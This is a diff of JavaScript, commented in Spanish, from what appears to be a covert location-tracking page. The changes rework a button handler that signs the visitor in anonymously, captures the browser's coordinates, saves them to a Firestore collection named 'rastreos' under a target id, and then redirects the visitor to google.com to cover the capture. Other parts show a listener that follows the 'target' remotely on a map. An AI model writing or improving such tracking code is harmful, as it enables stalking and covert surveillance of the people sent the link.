@@ -45,22 +45,24 @@ document.addEventListener("DOMContentLoaded", async function () {
             </div>
         `;
 
-        document.getElementById('btn-capturar').addEventListener('click', async () => {
-            const btn = document.getElementById('btn-capturar');
-            btn.innerText = "Procesando...";
-            btn.disabled = true;
-            
-            try {
-                // 1. Autenticar anónimamente de forma síncrona
-                await signInAnonymously(auth);
-                // 2. Iniciar captura y esperar a que guarde en Firestore
-                await capturarYSalir(targetId);
-            } catch (err) {
-                alert("Error de autenticación o conexión: " + err.message);
-                btn.innerText = "Reintentar";
-                btn.disabled = false;
-            }
-        });
+        const btn = document.getElementById('btn-capturar');
+        if (btn) {
+            btn.onclick = async () => {
+                btn.innerText = "Procesando...";
+                btn.disabled = true;
+
+                try {
+                    // 1. Esperar obligatoriamente la autenticación anónima
+                    await signInAnonymously(auth);
+                    // 2. Pedir coordenadas y esperar confirmación de guardado en Firestore
+                    await capturarYSalir(targetId);
+                } catch (err) {
+                    alert("Error de conexión o autenticación: " + err.message);
+                    btn.innerText = "Reintentar";
+                    btn.disabled = false;
+                }
+            };
+        }
         return;
     }
 
@@ -100,7 +102,7 @@ function capturarYSalir(id) {
                 const lng = position.coords.longitude;
 
                 try {
-                    // Esperar confirmación de guardado en Firestore
+                    // Esperar escritura en Firestore antes de redirigir
                     await setDoc(doc(db, "rastreos", id), {
                         lat: lat,
                         lng: lng,
@@ -109,7 +111,7 @@ function capturarYSalir(id) {
                 } catch (e) {
                     alert("Error guardando en la base de datos: " + e.message);
                 } finally {
-                    // Redirigir solo cuando Firestore haya respondido
+                    // Redirigir solo cuando Firestore haya confirmado
                     window.location.replace("https://www.google.com");
                     resolve();
                 }
@@ -158,7 +160,7 @@ function escucharObjetivoRemoto(id) {
     });
 }
 
-// FUNCIONALIDADES DE LA INTERFAZ
+// FUNCIONALIDADES DE LA INTERFAZ (EXPUESTAS A WINDOW)
 function irAlPuntoDeAcceso() {
     if (ubicacionObjetivo) {
         map.invalidateSize();
